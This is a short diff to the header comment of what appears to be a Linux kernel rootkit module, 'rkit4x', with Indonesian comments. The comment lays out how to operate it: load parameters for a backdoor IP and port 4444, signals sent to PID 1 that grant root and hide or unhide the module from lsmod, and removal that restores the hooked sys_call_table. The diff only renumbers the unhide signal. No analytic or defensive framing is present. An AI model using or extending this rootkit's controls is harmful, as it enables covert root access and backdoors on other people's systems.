@@ -7,7 +7,7 @@
  *                     backdoor_ip=10.0.0.5 backdoor_port=4444
  *   kill -s63 1        -> root
  *   kill -s64 1        -> sembunyikan modul (lsmod kosong)
- *   kill -s65 1        -> tampilkan modul lagi (WAJIB sebelum rmmod)
+ *   kill -s62 1        -> tampilkan modul lagi (WAJIB sebelum rmmod)
  *   rmmod rkit4x       -> kembalikan sys_call_table, semua bersih
  *
  * Kontrol era ini pakai SINYAL (gaya Diamorphine) karena tidak ada
